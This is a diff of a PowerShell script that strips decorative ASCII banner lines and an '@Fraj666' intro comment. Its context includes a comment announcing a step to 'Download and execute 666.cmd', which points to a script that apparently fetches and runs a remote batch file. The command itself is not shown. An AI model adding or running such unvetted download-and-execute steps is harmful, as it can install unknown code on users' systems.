@@ -16,9 +16,6 @@ if (-not $isConnected) {
     return
 }
 
-# 2. Connected -> Show centered @Fraj666 intro banner
-$topBone  = "   (o)=======================================================(o)   "
-$botSnake = "   ~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~^~<:===  "
 
 $banner = @(
     "   ____    ______                _    __    __    __   "
@@ -37,7 +34,6 @@ $padSize = [Math]::Max(0, [Math]::Floor(($winWidth - $boxWidth) / 2))
 $pad = " " * $padSize
 
 Write-Host ""
-Write-Host ($pad + $topBone) -ForegroundColor Gray
 Write-Host ""
 
 foreach ($line in $banner) {
@@ -46,7 +42,6 @@ foreach ($line in $banner) {
 }
 
 Write-Host ""
-Write-Host ($pad + $botSnake) -ForegroundColor Green
 Write-Host ""
 
 # 3. Download and execute 666.cmd
